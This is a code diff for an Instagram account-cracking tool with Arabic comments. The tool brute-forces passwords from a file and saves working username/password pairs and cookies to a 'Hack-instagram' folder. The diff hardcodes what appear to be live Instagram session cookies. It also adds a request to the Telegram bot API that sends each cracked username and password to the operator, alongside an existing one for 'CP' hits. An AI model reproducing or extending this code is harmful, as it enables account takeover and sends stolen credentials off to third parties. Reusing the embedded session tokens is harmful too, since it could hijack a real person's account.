@@ -156,7 +156,7 @@ console = Console()
 def cek_DYNO(user, cookie_string):
     session = requests.Session()
 
-    # تحويل الكوكيز من النص إلى شكل قابل للاستخدام
+    # تحويل الكوكيز من النص إلى شكل قاموس
     try:
         cookies = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookie_string.split('; ')}
     except Exception as e:
@@ -182,9 +182,10 @@ def cek_DYNO(user, cookie_string):
         console.print(f"\r [red]  Error: {e}")
 
 # كيفية الاستخدام:
-cookie_string = "datr=la91ZyugolYjsOk_hS3WaceC; ig_did=084282CC-A90C-498B-892B-DF0AD63ACE6C; dpr=1.6687500476837158; mid=Z3WvlgABAAF4Fvz0eROdgBTWK2n7; ig_nrcb=1; ps_l=1; ps_n=1; wd=432x887; csrftoken=ebfhNjqGZvxyMQumSq59U6jxc6Q8be6V; ds_user_id=63532616272; sessionid=63532616272%3AwspcHpCvG9EopT%3A10%3AAYe5bU3lawcfPKcY4neLvMs3afvRhGj4QfA3SE7NgA; rur=\"CLN\\05463532616272\\0541767321302:01f7f7b36b33b08ce79c7171b0c0a8945a7d9cda61df7477425740ca6c305d2c9e86ab8e\""
+cookie_string = "datr=la91ZyugolYjsOk_hS3WaceC; ig_did=084282CC-A90C-498B-892B-DF0AD63ACE6C; dpr=1.6687500476837158; mid=Z3WvlgABAAF4Fvz0eROdgBTWK2n7; ig_nrcb=1; ps_l=1; ps_n=1; wd=432x887; csrftoken=Etc4PgAK7iXgwRmenNeV4Lk6tDJZRVtP; ds_user_id=48416624176; sessionid=48416624176%3A2s6vuaL1AIvUjR%3A27%3AAYfYXCYW_0aIUViuAsmaR4qQF5T3rxK0cG3cGg_WKw; rur=\"LDC\\05448416624176\\0541767339582:01f7f0aec9ec28858359a3d976e6222c32609ee06a873ad4909c27bb59f9e9e80d015a40\""
 
 
+cek_DYNO(user, cookie_string)
 # كيفية الاستخدام:
 
 def Menu():
@@ -207,7 +208,7 @@ def Menu():
 \033[1;33m                  ____𝐖𝐞𝐥𝐥 𝐂𝐨𝐦𝐞 𝐓𝐨 𝐓𝐄𝐀𝐌 <✵> 𝐀𝐑𝐖 ____
 \n\033[1;00m''')
 
-        Console().print(f"\n {P2}[{H2}✵{P2}] 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 :_- {H2}𝚅3 \n")
+        Console().print(f"\n {P2}[{H2}✵{P2}] 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 :_-- {H2}𝚅3 \n")
         
         Console().print(f'\n [1]. 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐅𝐫𝐨𝐦 𝐅𝐢𝐥𝐞\n')
         Console().print(f'\n [2]. 𝐃𝐮𝐦𝐩 𝐅𝐢𝐥𝐞 𝐋𝐢𝐬𝐭 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 (soon)\n')
@@ -524,6 +525,8 @@ class Brute:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
                             console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
                             cek_DYNO(user, cookie_string)
+                            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ OK- : '+user+' ׀ '+pswd))
+
                             break
 
                 
@@ -537,7 +540,7 @@ class Brute:
                     self.cp += 1
                     open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
                     console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
-                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -  : '+user+' ׀ '+pswd))
+                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP- : '+user+' ׀ '+pswd))
                     cek_DYNO(user, cookie_string)
                     break
 
